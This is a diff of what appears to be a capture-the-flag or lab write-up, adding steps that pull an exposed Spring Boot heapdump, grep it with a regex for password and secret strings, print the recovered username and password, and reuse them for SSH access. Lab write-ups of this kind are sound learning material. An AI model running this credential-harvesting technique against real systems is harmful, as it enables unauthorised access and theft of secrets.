@@ -64,7 +64,10 @@ actuator/heapdump    (Status: 200) [Size: 80165337]
 Progress: 174 / 174 (100.00%)
 ```
 
-Being that **heapdump** is a snapshot in time of all memory within a JVM, we can gather som information.
+Being that **heapdump** is a snapshot in time of all memory within a JVM, we can gather som information using strings.
 
+I run:```strings heapdump | grep -Eai "(secret|passwd|password)\ ?[=|:]\ ?['|\"]?\w{1,}['|\"]?"```, and get:
 
+```{password=0sc@r190_S0l!dP@sswd, user=oscar190}!```
 
+Jackpot. I use these credentials for the SSH port from the beginning.
